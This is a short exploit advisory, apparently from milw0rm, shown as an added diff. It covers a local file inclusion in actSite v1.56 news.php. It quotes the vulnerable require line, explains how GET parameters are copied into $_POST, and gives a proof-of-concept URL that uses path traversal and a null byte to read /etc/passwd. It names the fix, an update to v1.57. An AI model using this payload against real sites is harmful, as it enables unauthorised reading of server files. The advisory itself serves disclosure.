@@ -1,0 +1,75 @@
+                         \#'#/
+
+                         (-.-)
+
+   -----------------oOO---(_)---OOo-----------------
+
+   | actSite v1.56 (news.php) Local File Inclusion |
+
+   |                 coded by DNX                  |
+
+   -------------------------------------------------
+
+[!] Discovered: DNX
+
+[!] Vendor: http://www.actsite.de
+
+[!] Detected: 02.09.2007
+
+[!] Reported: 02.09.2007
+
+[!] Remote: yes
+
+
+
+[!] Background: actSite is a content management system based on PHP and MySQL
+
+
+
+[!] Bug: in phpinc/news.php line 101
+
+
+
+         require PHP_INCLUDE_PATH."/inc/news/news_$_POST[do].php";
+
+
+
+[!] PoC: 
+
+    - http://[site]/[path]/phpinc/news.php?do=/../../../../../../../etc/passwd%00
+
+
+
+[!] Description:
+
+    - So why we can inject code in a post variable per url? Let's do some research...
+
+      - In phpinc/news.php line 36
+
+      	require_once('../config.php');
+
+
+
+      - Let's take a look in 'config.php' line 22
+
+        if(empty($BaseCfg['install_run'])) require_once($BaseCfg['BaseDir']."/phpinc/inc/csb.php");
+
+
+
+      - Ok, let's take a look in 'phpinc/inc/csb.php' line 18
+
+        if(getenv('REQUEST_METHOD') == "GET") {
+
+		foreach($_GET as $key => $val) {
+
+			 $_POST[$key] =& $_GET[$key];
+
+		}
+
+	}
+
+
+
+[!] Solution: Install security update to v1.57
+
+# milw0rm.com [2007-10-01]
